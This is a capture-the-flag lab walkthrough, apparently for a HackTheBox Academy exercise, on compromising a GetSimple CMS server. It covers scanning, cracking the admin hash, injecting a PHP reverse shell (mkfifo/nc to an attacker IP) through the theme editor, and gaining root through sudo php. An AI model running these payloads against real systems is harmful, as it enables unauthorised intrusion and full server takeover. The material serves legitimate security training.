# Knowledge Check

## Spawn the target, gain a foothold and submit the contents of the user.txt flag.


## 🔐 VPN Connection

>Before interacting with the target, I established a secure connection to the lab using **OpenVPN**.

```
openvp academy-regular.ovpn
```
## Service Scan using Nmap

```
nmap -v -sV  10.129.130.170
```

>Output
```
22/tcp open  ssh  OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 4c:73:a0:25:f5:fe:81:7b:82:2b:36:49:a5:4d:c8:5e (RSA)
|   256 e1:c0:56:d0:52:04:2f:3c:ac:9a:e7:b1:79:2b:db:13 (ECDSA)
|_  256 52:31:47:14:0d:c3:8e:15:73:e3:c4:24:a2:3a:12:77 (ED25519)
80/tcp open  http  Apache httpd 2.4.41 (Ubuntu)
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Welcome to GetSimple! - gettingstarted
| http-robots.txt: 1 disallowed entry
|_/admin/

```

 >Open the target on port 80 site `http://10.129.130.170/` in Firefox browsers.
 
## Nikto Web Server Scan

>Got port 80 in previous nmap scan. so we will run nikto to find file and directories

```
nikto -h 10.129.130.170
```

>Output

```
Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.129.130.170
+ Target Hostname:    10.129.130.170
+ Target Port:        80
+ Start Time:         2026-01-04 15:59:02 (GMT5.5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content as a different MIME type. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options
+ No CGI Directories found (use '-C all' to force check all dirs)
+ /robots.txt: Entry '/admin/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600300_robots-txt-file
+ /robots.txt: contains 1 entry which should be manually viewed. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Robots-Tag
+ Apache/2.4.41 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /sitemap.xml: This gives a nice listing of the site content.
+ /admin/: This might be interesting.
+ /data/: Directory indexing found.
+ /data/: This might be interesting.
+ /readme.txt: This might be interesting.
+ /admin/index.php: This might be interesting: has been seen in web logs from an unknown scanner.
+ /LICENSE.txt: License file found may identify site software.
---------------------------------------------------------------------------
+ End Time:           2026-01-04 16:00:12 (GMT5.5)
---------------------------------------------------------------------------

```
### Pages Identified Using Nikto

During the Nikto scan, a total of **7 interesting pages and files** were identified on the target web server. These pages may expose sensitive information or provide potential entry points for further enumeration and exploitation.

The identified paths include:

- `/admin/`
- `/admin/index.php`
- `/data/`
- `/readme.txt`
- `/LICENSE.txt`
- `/robots.txt`
- `/sitemap.xml`

>We have got login page 

<img width="908" height="471" alt="image" src="https://github.com/user-attachments/assets/1001bb8f-9d2d-44eb-818c-592f7ad04a4e" />



>After checking all pages. i found username and password

<img width="403" height="399" alt="image" src="https://github.com/user-attachments/assets/007f8a03-7d85-48ad-b821-da0c6642ae60" />

<img width="430" height="222" alt="image" src="https://github.com/user-attachments/assets/de3ed101-af20-4eca-b33e-606c9323882f" />

<img width="774" height="262" alt="image" src="https://github.com/user-attachments/assets/436ec8ba-1b78-4516-8345-e07b0ea70100" />


>But the password is encryption so we have to use hashcat to decryption.

```
echo "d033e22ae348aeb5660fc2140aec35850c4da997" >> KnowledgeCheck.txt
```

<img width="727" height="941" alt="image" src="https://github.com/user-attachments/assets/af2636a6-092d-4826-a81c-a69c42db3d8a" />


>Use --show to Display already cracked hashes

<img width="655" height="63" alt="image" src="https://github.com/user-attachments/assets/81d76576-e692-4f67-96aa-42730ce60306" />


>now we got username and password *admin/admin*. try to login.

<img width="1518" height="437" alt="image" src="https://github.com/user-attachments/assets/49ab6e28-6f6d-4614-a7af-33eb5c99aa0c" />

>We have got admin dashboard access. and After exploring a lot i find that home page and thame are vulnerable.

###Authenticated Remote Code Execution via Admin Dashboard

>The application allows an authenticated administrative user to directly insert and execute arbitrary PHP code through the admin dashboard by editing theme and home page files. Since PHP is a server-side scripting language, any injected code is executed on the server with the privileges of the web server.



<img width="1050" height="328" alt="image" src="https://github.com/user-attachments/assets/99b5066f-1b9a-4d9c-a228-87cac7eb2550" />

<img width="1241" height="974" alt="image" src="https://github.com/user-attachments/assets/31c4d03b-b456-499c-b8c1-acb2284950d9" />


>This behavior results in remote code execution, allowing an attacker with admin access to fully compromise the underlying system.

<img width="728" height="338" alt="image" src="https://github.com/user-attachments/assets/05afe90e-7661-44f1-a180-db95fadddd97" />




<img width="818" height="108" alt="image" src="https://github.com/user-attachments/assets/bb33ffd9-8001-43ea-8bcb-e959a367344f" />

```
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.146 9443 >/tmp/f"); ?>
```

<img width="536" height="124" alt="image" src="https://github.com/user-attachments/assets/e5f115e8-c885-4c32-9fa0-2c6b98e3107d" />

```
use ls to check directiry  
or  
python3 -c 'import pty; pty.spawn("/bin/bash
run this command for more interactive shell
```
> Firts Flag
<img width="296" height="217" alt="image" src="https://github.com/user-attachments/assets/d57f915c-53a9-405e-a0d5-19c3733db3e3" />

<img width="1375" height="545" alt="image" src="https://github.com/user-attachments/assets/e95a519c-be9b-46a7-b18e-733c0fd5531c" />
## After obtaining a foothold on the target, escalate privileges to root and submit the contents of the root.txt flag.

## Privilege Escalation

<img width="958" height="112" alt="image" src="https://github.com/user-attachments/assets/5ecffb08-d19a-4b4b-ac9e-ab43a54ac49d" />

https://github.com/rebootuser/LinEnum

https://academy.hackthebox.com/module/77/section/844

<img width="726" height="255" alt="image" src="https://github.com/user-attachments/assets/382972dc-6539-4e59-94e9-3593ec6de60b" />

>use vpn ip address

<img width="650" height="100" alt="image" src="https://github.com/user-attachments/assets/c04f49e0-4b1c-4682-afc3-392e4e541ba2" />

>use vpn ip address

<img width="644" height="192" alt="image" src="https://github.com/user-attachments/assets/c0679a95-ab2c-4a45-9524-19932a07b436" />

<img width="458" height="88" alt="image" src="https://github.com/user-attachments/assets/0c10fd9e-9d75-4cd0-8b51-c9743c6678c9" />

>its not working so i will use sudo -l

 <img width="753" height="134" alt="image" src="https://github.com/user-attachments/assets/db14c768-4dfb-4a9d-99d1-c16a23a94dda" />

>we can use /usr/bin/php without password
>
>got root shell
>
### 1️⃣ cd /usr/bin/

>Moves you into the /usr/bin directory.
>This directory contains system binaries like php, bash, sudo, etc.

### 2️⃣ CMD='/bin/sh'

>Creates a variable named CMD and stores /bin/sh in it.

>👉 /bin/sh = a shell (command-line interpreter)

### 3️⃣ sudo /usr/bin/php -r "system('$CMD');"

>This is the most important (and dangerous) part.

>Let’s split it:

>sudo → runs the command as root

>/usr/bin/php → executes PHP CLI

>-r → runs PHP code directly from the command line

>system('$CMD'); → executes the shell command stored in $CMD

>📌 Since $CMD = /bin/sh, this line effectively becomes:

>system('/bin/sh');


💥 Result:
A root shell is spawned.

<img width="604" height="91" alt="image" src="https://github.com/user-attachments/assets/69a8e468-9890-412d-84cc-1543cc163337" />
<br>

>Second Flag

<img width="374" height="198" alt="image" src="https://github.com/user-attachments/assets/103ca6db-d85b-4d62-8498-79c781c168c6" />




